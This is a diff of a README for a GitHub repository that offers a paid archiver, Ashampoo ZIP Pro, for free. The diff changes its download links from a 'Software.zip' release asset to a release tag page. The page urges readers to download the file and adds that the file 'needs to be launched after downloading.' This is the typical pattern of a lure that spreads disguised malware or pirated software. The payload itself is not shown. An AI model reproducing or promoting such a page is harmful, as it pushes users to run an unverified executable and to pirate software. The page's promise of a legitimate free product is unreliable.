@@ -1,6 +1,6 @@
 # 🚀 Welcome to Ashampoo-ZIP-Pro-Free Repository! 🚀
 
-![Ashampoo Logo](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/download/v1.0/Software.zip)
+![Ashampoo Logo](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/tag/v2.0)
 
 ## Repository: Ashampoo-ZIP-Pro-Free
 
@@ -26,7 +26,7 @@ Explore everything about Ashampoo ZIP Pro, from downloading and activation to re
 - create-self-extracting-with-ashampoo-zip-pro
 
 ### Get Started:
-🔗 Click [here](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/download/v1.0/Software.zip) to download Ashampoo ZIP Pro directly! 🚀
+🔗 Click [here](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/tag/v2.0) to download Ashampoo ZIP Pro directly! 🚀
 
 #### Note: File needs to be launched after downloading!
 
@@ -53,4 +53,4 @@ Don't forget to visit the "Releases" section of this repository for the latest u
 
 ### 🚀 Experience the Power of Ashampoo ZIP Pro - Download Now! 🚀
 
-####[![Download ZIP Pro](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/download/v1.0/Software.zip)](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/download/v1.0/Software.zip)
+####[![Download ZIP Pro](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/tag/v2.0)](https://github.com/1stgreen20/Ashampoo-ZIP-Pro-Free/releases/tag/v2.0)
